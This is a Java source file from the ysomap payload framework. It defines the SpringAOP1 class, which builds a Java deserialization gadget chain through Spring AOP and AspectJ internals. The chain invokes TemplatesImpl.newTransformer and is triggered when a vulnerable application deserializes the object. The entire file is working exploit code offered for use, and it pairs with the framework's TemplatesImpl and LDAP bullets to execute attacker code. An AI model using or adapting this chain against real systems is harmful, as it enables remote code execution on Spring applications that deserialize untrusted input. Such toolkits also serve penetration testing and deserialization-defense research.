package ysomap.payloads.java.spring;

import org.aopalliance.aop.Advice;
import org.aopalliance.intercept.MethodInterceptor;
import org.springframework.aop.Advisor;
import org.springframework.aop.aspectj.AbstractAspectJAdvice;
import org.springframework.aop.framework.AdvisedSupport;
import ysomap.bullets.Bullet;
import ysomap.bullets.jdk.TemplatesImplBullet;
import ysomap.common.annotation.*;
import ysomap.core.util.PayloadHelper;
import ysomap.core.util.ReflectionHelper;
import ysomap.payloads.AbstractPayload;

import javax.xml.transform.Templates;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.UUID;

/**
 * @author tyskill
 * @since 2025/02/13
 * <a href="https://mp.weixin.qq.com/s/oQ1mFohc332v8U1yA7RaMQ">在spring-aop中挖掘新反序列化gadget-chain@ape1ron</a>
 */
@Payloads
@SuppressWarnings({"rawtypes"})
@Authors({ Authors.APE1RON, Authors.TYSKILL })
@Targets({Targets.JDK})
@Require(bullets = {"LdapAttributeBullet", "TemplatesImplBullet"}, param = false)
@Dependencies({"spring-aop", "org.aspectj:aspectjweaver"})
public class SpringAOP1 extends AbstractPayload<Object> {

    @Override
    public Bullet getDefaultBullet(Object... args) throws Exception {
        return TemplatesImplBullet.newInstance(args);
    }

    @Override
    public Object pack(Object obj) throws Exception {
        Object advice = buildAbstractAspectJAdvice(obj);
        Object adviceInvocationProxy = PayloadHelper.makeSpringAOPProxy(advice, Advice.class, MethodInterceptor.class);

        // 生成 advisor
        Advisor advisor = (Advisor) ReflectionHelper.newInstance(
                "org.springframework.aop.support.DefaultIntroductionAdvisor", new Class[]{Advice.class}, adviceInvocationProxy);
        List<Advisor> advisors = new ArrayList<>();
        advisors.add(advisor);

        // 自定义 AdvisedSupport，控制 chain 生成过程
        AdvisedSupport advisedSupport = new AdvisedSupport();
        // Spring 5.x 需要用到 advisors 成员字段
        ReflectionHelper.setFieldValue(advisedSupport, "advisors", advisors);
        // Spring 4.x 需要用到 advisorArray 成员字段
        ReflectionHelper.setFieldValue(advisedSupport, "advisorArray", new Advisor[]{advisor});
        // 提供 interceptors
        Object advisorChainFactory = ReflectionHelper.createWithoutConstructor("org.springframework.aop.framework.DefaultAdvisorChainFactory");
        ReflectionHelper.setFieldValue(advisedSupport, "advisorChainFactory", advisorChainFactory);
        Object stringInvocationProxy = PayloadHelper.makeSpringAOPProxy(UUID.randomUUID().toString(), advisedSupport, Map.class);

        return PayloadHelper.makeReadObjectToStringTrigger(stringInvocationProxy);
    }

    private static Object buildAbstractAspectJAdvice(Object obj) throws Exception {
        AbstractAspectJAdvice advice =
                ReflectionHelper.createWithoutConstructor(org.springframework.aop.aspectj.AspectJAroundAdvice.class);

        // 塞入 bullets
        Object aspectInstanceFactory =
                ReflectionHelper.newInstance("org.springframework.aop.aspectj.SingletonAspectInstanceFactory", obj);
        ReflectionHelper.setFieldValue(advice, "aspectInstanceFactory", aspectInstanceFactory);

        ReflectionHelper.setFieldValue(advice, "declaringClass", Templates.class);
        ReflectionHelper.setFieldValue(advice, "methodName", "newTransformer");
        ReflectionHelper.setFieldValue(advice, "parameterTypes", new Class[0]);

        Object aspectJExpressionPointcut = ReflectionHelper.createWithoutConstructor("org.springframework.aop.aspectj.AspectJExpressionPointcut");
        ReflectionHelper.setFieldValue(advice,"pointcut", aspectJExpressionPointcut);
        ReflectionHelper.setFieldValue(advice,"joinPointArgumentIndex",-1);
        ReflectionHelper.setFieldValue(advice,"joinPointStaticPartArgumentIndex",-1);
        return advice;
    }
}